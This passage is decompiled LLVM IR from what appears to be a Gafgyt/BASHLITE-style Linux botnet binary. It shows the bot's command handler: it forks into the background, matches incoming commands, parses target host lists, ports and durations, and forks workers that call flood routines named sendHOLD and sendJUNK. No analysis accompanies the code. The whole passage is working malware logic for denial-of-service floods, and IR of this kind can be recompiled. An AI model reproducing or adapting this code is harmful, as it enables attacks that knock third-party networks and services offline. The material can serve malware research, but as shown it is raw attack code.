  br i1 %v1_804f717, label %dec_label_pc_804f766, label %dec_label_pc_804f719

dec_label_pc_804f719:                             ; preds = %dec_label_pc_804f6cf
  %v0_804f719 = load i32, i32* @global_var_8065b50.876, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f71e = icmp eq i32 %v0_804f719, 0
  %v1_804f720 = icmp eq i1 %v1_804f71e, false
  br i1 %v1_804f720, label %dec_label_pc_8050835, label %dec_label_pc_804f726

dec_label_pc_804f726:                             ; preds = %dec_label_pc_804f719
  %v1_804f726 = call i32 @__libc_fork(i32 3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f731 = icmp eq i32 %v1_804f726, 0
  br i1 %v4_804f731, label %dec_label_pc_804f757, label %dec_label_pc_804f73a

dec_label_pc_804f73a:                             ; preds = %dec_label_pc_804f726
  store i32 %v1_804f726, i32* @global_var_8065b50.876, align 16
  br label %dec_label_pc_8050835

dec_label_pc_804f757:                             ; preds = %dec_label_pc_804f726
  store i1 true, i1* %cf.global-to-local, align 1
  %v1_804f757 = call i32 @StartTheLelz(i32 0)
  %v0_804f75c = load i32, i32* @esp, align 4
  %v5_804f75c = icmp ult i32 %v0_804f75c, 12
  store i1 %v5_804f75c, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_804f761 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f766:                             ; preds = %dec_label_pc_804f5d9, %dec_label_pc_804f6cf
  %v2_804f769 = load i32, i32* %v1_804f416, align 4
  store i1 false, i1* @df, align 1
  %v4_804f786 = inttoptr i32 %v2_804f769 to i8*
  %v7_804f798 = call i32 @_strncmp(i8* %v4_804f786, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805c883.879, i32 0, i32 0), i32 6)
  %v8_804f798 = urem i32 %v7_804f798, 2
  %v9_804f798 = icmp eq i32 %v8_804f798, 0
  %v0_804f79a = load i1, i1* %cf.global-to-local, align 1
  %v2_804f79a = or i1 %v0_804f79a, %v9_804f798
  %v3_804f79a = zext i1 %v2_804f79a to i32
  %v4_804f79a = load i32, i32* %edx.global-to-local, align 4
  %v5_804f79a = and i32 %v4_804f79a, -256
  %v6_804f79a = or i32 %v3_804f79a, %v5_804f79a
  %v7_804f79a = xor i32 %v6_804f79a, 1
  store i32 %v7_804f79a, i32* %edx.global-to-local, align 4
  %v1_804f7a2 = trunc i32 %v7_804f79a to i8
  %v3_804f7a2 = zext i1 %v0_804f79a to i8
  %v4_804f7a2 = sub nsw i8 %v1_804f7a2, %v3_804f7a2
  %v15_804f7a2 = icmp eq i8 %v4_804f7a2, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f7ab = icmp eq i1 %v15_804f7a2, false
  br i1 %v1_804f7ab, label %dec_label_pc_804f826, label %dec_label_pc_804f7ad

dec_label_pc_804f7ad:                             ; preds = %dec_label_pc_804f766
  %v2_804f7a6 = sext i8 %v4_804f7a2 to i32
  %v8_804f7ad = icmp ult i32 %tmp207, 2
  store i1 %v8_804f7ad, i1* %cf.global-to-local, align 1
  %v12_804f7ad = icmp eq i32 %tmp207, 2
  %v1_804f7b1 = icmp eq i1 %v12_804f7ad, false
  br i1 %v1_804f7b1, label %dec_label_pc_8050835, label %dec_label_pc_804f7b7

dec_label_pc_804f7b7:                             ; preds = %dec_label_pc_804f7ad
  %v1_804f7ba = add i32 %tmp223, 4
  %v5_804f7ba = icmp ugt i32 %tmp223, -5
  store i1 %v5_804f7ba, i1* %cf.global-to-local, align 1
  %v1_804f7bd = inttoptr i32 %v1_804f7ba to i32*
  %v2_804f7bd = load i32, i32* %v1_804f7bd, align 4
  store i1 false, i1* @df, align 1
  %v4_804f7da = inttoptr i32 %v2_804f7bd to i8*
  store i32 %v2_804f7bd, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_805c880.878 to i32), i32* @edi, align 4
  %v7_804f7ec = call i32 @_strncmp(i8* %v4_804f7da, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805c880.878, i32 0, i32 0), i32 3)
  %v8_804f7ec = urem i32 %v7_804f7ec, 2
  %v9_804f7ec = icmp eq i32 %v8_804f7ec, 0
  %v0_804f7ee = load i1, i1* %cf.global-to-local, align 1
  %v2_804f7ee = or i1 %v0_804f7ee, %v9_804f7ec
  %v3_804f7ee = zext i1 %v2_804f7ee to i32
  %v4_804f7ee = load i32, i32* %edx.global-to-local, align 4
  %v5_804f7ee = and i32 %v4_804f7ee, -256
  %v6_804f7ee = or i32 %v3_804f7ee, %v5_804f7ee
  %v7_804f7ee = xor i32 %v6_804f7ee, 1
  store i32 %v7_804f7ee, i32* %edx.global-to-local, align 4
  %v1_804f7f6 = trunc i32 %v7_804f7ee to i8
  %v3_804f7f6 = zext i1 %v0_804f7ee to i8
  %v15_804f7f6 = icmp eq i8 %v1_804f7f6, %v3_804f7f6
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f7ff = icmp eq i1 %v15_804f7f6, false
  br i1 %v1_804f7ff, label %dec_label_pc_804f826, label %dec_label_pc_804f801

dec_label_pc_804f801:                             ; preds = %dec_label_pc_804f7b7
  %v0_804f801 = load i32, i32* @global_var_805f8c0.20, align 64
  %v0_804f806 = load i32, i32* @esp, align 4
  %v5_804f806 = icmp ult i32 %v0_804f806, 8
  store i1 %v5_804f806, i1* %cf.global-to-local, align 1
  store i32 %v0_804f801, i32* %stack_var_-476, align 4
  %v2_804f80f = call i32 @HackerPrint(i32 %v0_804f801, i32 ptrtoint ([25 x i8]* @global_var_805c889.880 to i32))
  %v0_804f814 = load i32, i32* @esp, align 4
  %v2_804f814 = icmp ugt i32 %v0_804f814, -17
  store i1 %v2_804f814, i1* %cf.global-to-local, align 1
  %v0_804f817 = call i32 @StartTheNetis()
  %v0_804f81c = load i32, i32* @esp, align 4
  %v5_804f81c = icmp ult i32 %v0_804f81c, 12
  store i1 %v5_804f81c, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-476, align 4
  %v1_804f821 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f826:                             ; preds = %dec_label_pc_804f7b7, %dec_label_pc_804f766
  %v2_804f829 = load i32, i32* %v1_804f416, align 4
  store i1 false, i1* @df, align 1
  %v4_804f846 = inttoptr i32 %v2_804f829 to i8*
  store i32 %v2_804f829, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805c8a2.881 to i32), i32* @edi, align 4
  %v7_804f858 = call i32 @_strncmp(i8* %v4_804f846, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805c8a2.881, i32 0, i32 0), i32 5)
  %v8_804f858 = urem i32 %v7_804f858, 2
  %v9_804f858 = icmp eq i32 %v8_804f858, 0
  %v0_804f85a = load i1, i1* %cf.global-to-local, align 1
  %v2_804f85a = or i1 %v0_804f85a, %v9_804f858
  %v3_804f85a = zext i1 %v2_804f85a to i32
  %v4_804f85a = load i32, i32* %edx.global-to-local, align 4
  %v5_804f85a = and i32 %v4_804f85a, -256
  %v6_804f85a = or i32 %v3_804f85a, %v5_804f85a
  %v7_804f85a = xor i32 %v6_804f85a, 1
  store i32 %v7_804f85a, i32* @edx, align 4
  %v1_804f862 = trunc i32 %v7_804f85a to i8
  %v3_804f862 = zext i1 %v0_804f85a to i8
  %v4_804f862 = sub nsw i8 %v1_804f862, %v3_804f862
  %v15_804f862 = icmp eq i8 %v4_804f862, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f86b = icmp eq i1 %v15_804f862, false
  br i1 %v1_804f86b, label %dec_label_pc_804f9b4, label %dec_label_pc_804f871

dec_label_pc_804f871:                             ; preds = %dec_label_pc_804f826
  %v2_804f866 = sext i8 %v4_804f862 to i32
  %v9_804f871 = icmp ult i32 %tmp207, 3
  store i1 %v9_804f871, i1* %cf.global-to-local, align 1
  %v7_804f875 = icmp sgt i32 %tmp207, 3
  br i1 %v7_804f875, label %dec_label_pc_804f87b, label %dec_label_pc_8050835

dec_label_pc_804f87b:                             ; preds = %dec_label_pc_804f871
  %v1_804f87e = add i32 %tmp223, 8
  %v1_804f881 = inttoptr i32 %v1_804f87e to i32*
  %v2_804f881 = load i32, i32* %v1_804f881, align 4
  %v0_804f883 = load i32, i32* @esp, align 4
  %v5_804f883 = icmp ult i32 %v0_804f883, 12
  store i1 %v5_804f883, i1* %cf.global-to-local, align 1
  store i32 %v2_804f881, i32* %stack_var_-492, align 4
  %v1_804f887 = call i32 @atol(i32 %v2_804f881)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp253 = icmp slt i32 %v1_804f887, 1
  br i1 %tmp253, label %dec_label_pc_8050835, label %dec_label_pc_804f897

dec_label_pc_804f897:                             ; preds = %dec_label_pc_804f87b
  %v1_804f89a = add i32 %tmp223, 12
  %v1_804f89d = inttoptr i32 %v1_804f89a to i32*
  %v2_804f89d = load i32, i32* %v1_804f89d, align 4
  %v5_804f89f = icmp ult i32* %stack_var_-476, inttoptr (i32 12 to i32*)
  store i1 %v5_804f89f, i1* %cf.global-to-local, align 1
  store i32 %v2_804f89d, i32* %stack_var_-492, align 4
  %v1_804f8a3 = call i32 @atol(i32 %v2_804f89d)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp254 = icmp slt i32 %v1_804f8a3, 1
  %tmp255 = icmp eq i1 %tmp254, false
  br i1 %tmp255, label %dec_label_pc_804f8b4, label %dec_label_pc_8050835

dec_label_pc_804f8b4:                             ; preds = %dec_label_pc_804f897
  %v1_804f8b7 = add i32 %tmp223, 4
  %v1_804f8ba = inttoptr i32 %v1_804f8b7 to i32*
  %v2_804f8ba = load i32, i32* %v1_804f8ba, align 4
  %v2_804f8c8 = load i32, i32* %v1_804f881, align 4
  store i1 %v5_804f89f, i1* %cf.global-to-local, align 1
  store i32 %v2_804f8c8, i32* %stack_var_-492, align 4
  %v1_804f8ce = call i32 @atol(i32 %v2_804f8c8)
  %v2_804f8e2 = load i32, i32* %v1_804f89d, align 4
  store i1 %v5_804f89f, i1* %cf.global-to-local, align 1
  store i32 %v2_804f8e2, i32* %stack_var_-492, align 4
  %v1_804f8e8 = call i32 @atol(i32 %v2_804f8e2)
  %v5_804f8fc = icmp ult i32* %stack_var_-476, inttoptr (i32 8 to i32*)
  store i1 %v5_804f8fc, i1* %cf.global-to-local, align 1
  store i32 %v2_804f8ba, i32* %stack_var_-492, align 4
  %v2_804f902 = inttoptr i32 %v2_804f8ba to i8*
  %v3_804f902 = call i32 @__GI_strchr(i8* %v2_804f902, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f90a = icmp eq i32 %v3_804f902, 0
  br i1 %v1_804f90a, label %dec_label_pc_804f980, label %dec_label_pc_804f90e

dec_label_pc_804f90e:                             ; preds = %dec_label_pc_804f8b4
  store i32 %v2_804f8ba, i32* @eax, align 4
  store i1 %v5_804f8fc, i1* %cf.global-to-local, align 1
  store i32 %v2_804f8ba, i32* %stack_var_-492, align 4
  %v2_804f91d = call i32 @__GI_strtok(i32 %v2_804f8ba, i32 ptrtoint (i32* @global_var_805c7f1.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f975305 = icmp eq i32 %v2_804f91d, 0
  %v1_804f97c306 = icmp eq i1 %v4_804f975305, false
  br i1 %v1_804f97c306, label %dec_label_pc_804f92d, label %dec_label_pc_804f9b4

dec_label_pc_804f92d:                             ; preds = %dec_label_pc_804f90e, %dec_label_pc_804f95d
  %storemerge116307 = phi i32 [ %v2_804f967, %dec_label_pc_804f95d ], [ %v2_804f91d, %dec_label_pc_804f90e ]
  %v0_804f92d = call i32 @listFork()
  store i32 %v0_804f92d, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f932 = icmp eq i32 %v0_804f92d, 0
  %v1_804f934 = icmp eq i1 %v1_804f932, false
  %v0_804f95d = load i32, i32* @esp, align 4
  br i1 %v1_804f934, label %dec_label_pc_804f95d, label %dec_label_pc_804f936

dec_label_pc_804f936:                             ; preds = %dec_label_pc_804f92d
  %v5_804f936 = icmp ult i32 %v0_804f95d, 4
  store i1 %v5_804f936, i1* %cf.global-to-local, align 1
  store i32 %storemerge116307, i32* %stack_var_-492, align 4
  %v3_804f94b = call i32 @sendHOLD(i32 %storemerge116307, i32 %v1_804f8ce, i32 %v1_804f8e8)
  store i1 %v5_804f89f, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-492, align 4
  %v1_804f958 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f95d:                             ; preds = %dec_label_pc_804f92d
  %v5_804f95d = icmp ult i32 %v0_804f95d, 8
  store i1 %v5_804f95d, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-492, align 4
  %v2_804f967 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805c7f1.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f975 = icmp eq i32 %v2_804f967, 0
  %v1_804f97c = icmp eq i1 %v4_804f975, false
  br i1 %v1_804f97c, label %dec_label_pc_804f92d, label %dec_label_pc_804f9b4

dec_label_pc_804f980:                             ; preds = %dec_label_pc_804f8b4
  %v0_804f980 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f985 = icmp eq i32 %v0_804f980, 0
  %v1_804f987 = icmp eq i1 %v1_804f985, false
  br i1 %v1_804f987, label %dec_label_pc_8050835, label %dec_label_pc_804f98d

dec_label_pc_804f98d:                             ; preds = %dec_label_pc_804f980
  %v0_804f98d = load i32, i32* @esp, align 4
  %v5_804f98d = icmp ult i32 %v0_804f98d, 4
  store i1 %v5_804f98d, i1* %cf.global-to-local, align 1
  store i32 %v2_804f8ba, i32* %stack_var_-492, align 4
  %v3_804f9a2 = call i32 @sendHOLD(i32 %v2_804f8ba, i32 %v1_804f8ce, i32 %v1_804f8e8)
  store i1 %v5_804f89f, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-492, align 4
  %v1_804f9af = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f9b4:                             ; preds = %dec_label_pc_804f90e, %dec_label_pc_804f95d, %dec_label_pc_804f826
  %v2_804f9b7 = load i32, i32* %v1_804f416, align 4
  store i1 false, i1* @df, align 1
  %v4_804f9d4 = inttoptr i32 %v2_804f9b7 to i8*
  store i32 %v2_804f9b7, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805c8a7.882 to i32), i32* @edi, align 4
  %v7_804f9e6 = call i32 @_strncmp(i8* %v4_804f9d4, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805c8a7.882, i32 0, i32 0), i32 5)
  %v8_804f9e6 = urem i32 %v7_804f9e6, 2
  %v9_804f9e6 = icmp eq i32 %v8_804f9e6, 0
  %v0_804f9e8 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f9e8 = or i1 %v0_804f9e8, %v9_804f9e6
  %v3_804f9e8 = zext i1 %v2_804f9e8 to i32
  %v4_804f9e8 = load i32, i32* @edx, align 4
  %v5_804f9e8 = and i32 %v4_804f9e8, -256
  %v6_804f9e8 = or i32 %v3_804f9e8, %v5_804f9e8
  %v7_804f9e8 = xor i32 %v6_804f9e8, 1
  store i32 %v7_804f9e8, i32* @edx, align 4
  %v1_804f9f0 = trunc i32 %v7_804f9e8 to i8
  %v3_804f9f0 = zext i1 %v0_804f9e8 to i8
  %v4_804f9f0 = sub nsw i8 %v1_804f9f0, %v3_804f9f0
  %v15_804f9f0 = icmp eq i8 %v4_804f9f0, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f9f9 = icmp eq i1 %v15_804f9f0, false
  br i1 %v1_804f9f9, label %dec_label_pc_804fb57, label %dec_label_pc_804f9ff

dec_label_pc_804f9ff:                             ; preds = %dec_label_pc_804f9b4
  %v2_804f9f4 = sext i8 %v4_804f9f0 to i32
  %v9_804f9ff = icmp ult i32 %tmp207, 3
  store i1 %v9_804f9ff, i1* %cf.global-to-local, align 1
  %v7_804fa03 = icmp sgt i32 %tmp207, 3
  br i1 %v7_804fa03, label %dec_label_pc_804fa09, label %dec_label_pc_8050835

dec_label_pc_804fa09:                             ; preds = %dec_label_pc_804f9ff
  %v1_804fa0c = add i32 %tmp223, 8
  %v1_804fa0f = inttoptr i32 %v1_804fa0c to i32*
  %v2_804fa0f = load i32, i32* %v1_804fa0f, align 4
  %v0_804fa11 = load i32, i32* @esp, align 4
  %v5_804fa11 = icmp ult i32 %v0_804fa11, 12
  store i1 %v5_804fa11, i1* %cf.global-to-local, align 1
  store i32 %v2_804fa0f, i32* %stack_var_-508, align 4
  %v1_804fa15 = call i32 @atol(i32 %v2_804fa0f)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp256 = icmp slt i32 %v1_804fa15, 1
  br i1 %tmp256, label %dec_label_pc_8050835, label %dec_label_pc_804fa25

dec_label_pc_804fa25:                             ; preds = %dec_label_pc_804fa09
  %v1_804fa28 = add i32 %tmp223, 12
  %v1_804fa2b = inttoptr i32 %v1_804fa28 to i32*
  %v2_804fa2b = load i32, i32* %v1_804fa2b, align 4
  %v5_804fa2d = icmp ult i32* %stack_var_-492, inttoptr (i32 12 to i32*)
  store i1 %v5_804fa2d, i1* %cf.global-to-local, align 1
  store i32 %v2_804fa2b, i32* %stack_var_-508, align 4
  %v1_804fa31 = call i32 @atol(i32 %v2_804fa2b)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp257 = icmp slt i32 %v1_804fa31, 1
  %tmp258 = icmp eq i1 %tmp257, false
  br i1 %tmp258, label %dec_label_pc_804fa42, label %dec_label_pc_8050835

dec_label_pc_804fa42:                             ; preds = %dec_label_pc_804fa25
  %v1_804fa45 = add i32 %tmp223, 4
  %v1_804fa48 = inttoptr i32 %v1_804fa45 to i32*
  %v2_804fa48 = load i32, i32* %v1_804fa48, align 4
  %v2_804fa56 = load i32, i32* %v1_804fa0f, align 4
  store i1 %v5_804fa2d, i1* %cf.global-to-local, align 1
  store i32 %v2_804fa56, i32* %stack_var_-508, align 4
  %v1_804fa5c = call i32 @atol(i32 %v2_804fa56)
  %v2_804fa70 = load i32, i32* %v1_804fa2b, align 4
  store i1 %v5_804fa2d, i1* %cf.global-to-local, align 1
  store i32 %v2_804fa70, i32* %stack_var_-508, align 4
  %v1_804fa76 = call i32 @atol(i32 %v2_804fa70)
  %v5_804fa8a = icmp ult i32* %stack_var_-492, inttoptr (i32 8 to i32*)
  store i1 %v5_804fa8a, i1* %cf.global-to-local, align 1
  store i32 %v2_804fa48, i32* %stack_var_-508, align 4
  %v2_804fa90 = inttoptr i32 %v2_804fa48 to i8*
  %v3_804fa90 = call i32 @__GI_strchr(i8* %v2_804fa90, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fa98 = icmp eq i32 %v3_804fa90, 0
  br i1 %v1_804fa98, label %dec_label_pc_804fb23, label %dec_label_pc_804faa0

dec_label_pc_804faa0:                             ; preds = %dec_label_pc_804fa42
  store i32 %v2_804fa48, i32* @eax, align 4
  store i1 %v5_804fa8a, i1* %cf.global-to-local, align 1
  store i32 %v2_804fa48, i32* %stack_var_-508, align 4
  %v2_804faaf = call i32 @__GI_strtok(i32 %v2_804fa48, i32 ptrtoint (i32* @global_var_805c7f1.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fb18302 = icmp eq i32 %v2_804faaf, 0
  %v1_804fb1f303 = icmp eq i1 %v4_804fb18302, false
  br i1 %v1_804fb1f303, label %dec_label_pc_804fabf, label %dec_label_pc_804fb57

dec_label_pc_804fabf:                             ; preds = %dec_label_pc_804faa0, %dec_label_pc_804fb00
  %storemerge117304 = phi i32 [ %v2_804fb0a, %dec_label_pc_804fb00 ], [ %v2_804faaf, %dec_label_pc_804faa0 ]
  %v0_804fabf = call i32 @listFork()
  store i32 %v0_804fabf, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fac4 = icmp eq i32 %v0_804fabf, 0
  %v1_804fac6 = icmp eq i1 %v1_804fac4, false
  %v0_804fb00 = load i32, i32* @esp, align 4
  br i1 %v1_804fac6, label %dec_label_pc_804fb00, label %dec_label_pc_804fac8

dec_label_pc_804fac8:                             ; preds = %dec_label_pc_804fabf
  %v5_804fac8 = icmp ult i32 %v0_804fb00, 4
  store i1 %v5_804fac8, i1* %cf.global-to-local, align 1
  store i32 %storemerge117304, i32* %stack_var_-508, align 4
  %v3_804fadd = call i32 @sendJUNK(i32 %storemerge117304, i32 %v1_804fa5c, i32 %v1_804fa76)
  %v0_804fae5 = load i32, i32* @global_var_805f8c0.20, align 64
  store i1 %v5_804fa2d, i1* %cf.global-to-local, align 1
  store i32 %v0_804fae5, i32* %stack_var_-508, align 4
  %v1_804faee = call i32 @__libc_close(i32 %v0_804fae5)
  store i1 %v5_804fa2d, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v1_804fafb = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804fb00:                             ; preds = %dec_label_pc_804fabf
  %v5_804fb00 = icmp ult i32 %v0_804fb00, 8
  store i1 %v5_804fb00, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v2_804fb0a = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805c7f1.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fb18 = icmp eq i32 %v2_804fb0a, 0
  %v1_804fb1f = icmp eq i1 %v4_804fb18, false
  br i1 %v1_804fb1f, label %dec_label_pc_804fabf, label %dec_label_pc_804fb57

dec_label_pc_804fb23:                             ; preds = %dec_label_pc_804fa42
  %v0_804fb23 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fb28 = icmp eq i32 %v0_804fb23, 0
  %v1_804fb2a = icmp eq i1 %v1_804fb28, false
  br i1 %v1_804fb2a, label %dec_label_pc_8050835, label %dec_label_pc_804fb30

dec_label_pc_804fb30:                             ; preds = %dec_label_pc_804fb23
  %v0_804fb30 = load i32, i32* @esp, align 4
  %v5_804fb30 = icmp ult i32 %v0_804fb30, 4
  store i1 %v5_804fb30, i1* %cf.global-to-local, align 1
  store i32 %v2_804fa48, i32* %stack_var_-508, align 4
  %v3_804fb45 = call i32 @sendJUNK(i32 %v2_804fa48, i32 %v1_804fa5c, i32 %v1_804fa76)
  store i1 %v5_804fa2d, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v1_804fb52 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804fb57:                             ; preds = %dec_label_pc_804faa0, %dec_label_pc_804fb00, %dec_label_pc_804f9b4
  %v2_804fb5a = load i32, i32* %v1_804f416, align 4
  store i1 false, i1* @df, align 1
  %v4_804fb77 = inttoptr i32 %v2_804fb5a to i8*
  store i32 ptrtoint ([4 x i8]* @global_var_805c8ac.883 to i32), i32* @edi, align 4
  %v7_804fb89 = call i32 @_strncmp(i8* %v4_804fb77, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805c8ac.883, i32 0, i32 0), i32 4)
  %v8_804fb89 = urem i32 %v7_804fb89, 2
  %v9_804fb89 = icmp eq i32 %v8_804fb89, 0
  %v0_804fb8b = load i1, i1* %cf.global-to-local, align 1
  %v2_804fb8b = or i1 %v0_804fb8b, %v9_804fb89
  %v3_804fb8b = zext i1 %v2_804fb8b to i32
  %v4_804fb8b = load i32, i32* @edx, align 4
  %v5_804fb8b = and i32 %v4_804fb8b, -256
  %v6_804fb8b = or i32 %v3_804fb8b, %v5_804fb8b
  %v7_804fb8b = xor i32 %v6_804fb8b, 1
  store i32 %v7_804fb8b, i32* @edx, align 4
  %v1_804fb93 = trunc i32 %v7_804fb8b to i8
  %v3_804fb93 = zext i1 %v0_804fb8b to i8
  %v4_804fb93 = sub nsw i8 %v1_804fb93, %v3_804fb93
  %v15_804fb93 = icmp eq i8 %v4_804fb93, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fb9c = icmp eq i1 %v15_804fb93, false
  br i1 %v1_804fb9c, label %dec_label_pc_804fddf, label %dec_label_pc_804fba2

dec_label_pc_804fba2:                             ; preds = %dec_label_pc_804fb57
  %v2_804fb97 = sext i8 %v4_804fb93 to i32
  %v9_804fba2 = icmp ult i32 %tmp207, 5
  store i1 %v9_804fba2, i1* %cf.global-to-local, align 1
  %v7_804fba6 = icmp sgt i32 %tmp207, 5
  br i1 %v7_804fba6, label %dec_label_pc_804fbac, label %dec_label_pc_8050835

dec_label_pc_804fbac:                             ; preds = %dec_label_pc_804fba2
  %v1_804fbaf = add i32 %tmp223, 12
  %v1_804fbb2 = inttoptr i32 %v1_804fbaf to i32*
  %v2_804fbb2 = load i32, i32* %v1_804fbb2, align 4
  %v0_804fbb4 = load i32, i32* @esp, align 4
  %v5_804fbb4 = icmp ult i32 %v0_804fbb4, 12
  store i1 %v5_804fbb4, i1* %cf.global-to-local, align 1
  store i32 %v2_804fbb2, i32* %stack_var_-476, align 4
  %v1_804fbb8 = call i32 @atol(i32 %v2_804fbb2)
  %v5_804fbc0 = icmp ne i32 %v1_804fbb8, -1
  store i1 %v5_804fbc0, i1* %cf.global-to-local, align 1
  %v10_804fbc0 = icmp eq i32 %v1_804fbb8, -1
  br i1 %v10_804fbc0, label %dec_label_pc_8050835, label %dec_label_pc_804fbc9

dec_label_pc_804fbc9:                             ; preds = %dec_label_pc_804fbac
  %v1_804fbcc = add i32 %tmp223, 8
  %v1_804fbcf = inttoptr i32 %v1_804fbcc to i32*
  %v2_804fbcf = load i32, i32* %v1_804fbcf, align 4
  %v5_804fbd1 = icmp ult i32* %stack_var_-460, inttoptr (i32 12 to i32*)
  store i1 %v5_804fbd1, i1* %cf.global-to-local, align 1
  store i32 %v2_804fbcf, i32* %stack_var_-476, align 4
  %v1_804fbd5 = call i32 @atol(i32 %v2_804fbcf)
  %v5_804fbdd = icmp ne i32 %v1_804fbd5, -1
  store i1 %v5_804fbdd, i1* %cf.global-to-local, align 1
  %v10_804fbdd = icmp eq i32 %v1_804fbd5, -1
  br i1 %v10_804fbdd, label %dec_label_pc_8050835, label %dec_label_pc_804fbe6

dec_label_pc_804fbe6:                             ; preds = %dec_label_pc_804fbc9
  %v1_804fbe9 = add i32 %tmp223, 16
  %v1_804fbec = inttoptr i32 %v1_804fbe9 to i32*
  %v2_804fbec = load i32, i32* %v1_804fbec, align 4
  store i1 %v5_804fbd1, i1* %cf.global-to-local, align 1
  store i32 %v2_804fbec, i32* %stack_var_-476, align 4
  %v1_804fbf2 = call i32 @atol(i32 %v2_804fbec)
  %v5_804fbfa = icmp ne i32 %v1_804fbf2, -1
  store i1 %v5_804fbfa, i1* %cf.global-to-local, align 1
  %v10_804fbfa = icmp eq i32 %v1_804fbf2, -1
  br i1 %v10_804fbfa, label %dec_label_pc_8050835, label %dec_label_pc_804fc03

dec_label_pc_804fc03:                             ; preds = %dec_label_pc_804fbe6
  %v1_804fc06 = add i32 %tmp223, 20
  %v1_804fc09 = inttoptr i32 %v1_804fc06 to i32*
  %v2_804fc09 = load i32, i32* %v1_804fc09, align 4
  store i1 %v5_804fbd1, i1* %cf.global-to-local, align 1
  store i32 %v2_804fc09, i32* %stack_var_-476, align 4
  %v1_804fc0f = call i32 @atol(i32 %v2_804fc09)
  %v5_804fc17 = icmp ne i32 %v1_804fc0f, -1
  store i1 %v5_804fc17, i1* %cf.global-to-local, align 1
  %v10_804fc17 = icmp eq i32 %v1_804fc0f, -1
  br i1 %v10_804fc17, label %dec_label_pc_8050835, label %dec_label_pc_804fc20

dec_label_pc_804fc20:                             ; preds = %dec_label_pc_804fc03
  %v2_804fc26 = load i32, i32* %v1_804fc09, align 4
  store i1 %v5_804fbd1, i1* %cf.global-to-local, align 1
  store i32 %v2_804fc26, i32* %stack_var_-476, align 4
  %v1_804fc2c = call i32 @atol(i32 %v2_804fc26)
  %v1_804fc34 = add i32 %v1_804fc2c, -65500
  %v5_804fc34 = icmp ult i32 %v1_804fc2c, 65500
  %v6_804fc34 = sub i32 65499, %v1_804fc2c
  %v7_804fc34 = and i32 %v6_804fc34, %v1_804fc2c
  %v8_804fc34 = icmp slt i32 %v7_804fc34, 0
  store i1 %v5_804fc34, i1* %cf.global-to-local, align 1
  %v9_804fc34 = icmp eq i32 %v1_804fc34, 0
  %v10_804fc34 = icmp slt i32 %v1_804fc34, 0
  %v3_804fc39 = icmp eq i1 %v10_804fc34, %v8_804fc34
  %v4_804fc39 = icmp eq i1 %v9_804fc34, false
  %v5_804fc39 = and i1 %v4_804fc39, %v3_804fc39
  br i1 %v5_804fc39, label %dec_label_pc_8050835, label %dec_label_pc_804fc3f

dec_label_pc_804fc3f:                             ; preds = %dec_label_pc_804fc20
  %v2_804fc45 = load i32, i32* %v1_804fbec, align 4
  store i1 %v5_804fbd1, i1* %cf.global-to-local, align 1
  store i32 %v2_804fc45, i32* %stack_var_-476, align 4
  %v1_804fc4b = call i32 @atol(i32 %v2_804fc45)
  %v1_804fc53 = add i32 %v1_804fc4b, -32
  %v2_804fc53 = icmp ult i32 %v1_804fc4b, 32
  %v3_804fc53 = sub i32 31, %v1_804fc4b
  %v4_804fc53 = and i32 %v3_804fc53, %v1_804fc4b
  %v5_804fc53 = icmp slt i32 %v4_804fc53, 0
  store i1 %v2_804fc53, i1* %cf.global-to-local, align 1
  %v6_804fc53 = icmp eq i32 %v1_804fc53, 0
  %v7_804fc53 = icmp slt i32 %v1_804fc53, 0
  %v3_804fc56 = icmp eq i1 %v7_804fc53, %v5_804fc53
  %v4_804fc56 = icmp eq i1 %v6_804fc53, false
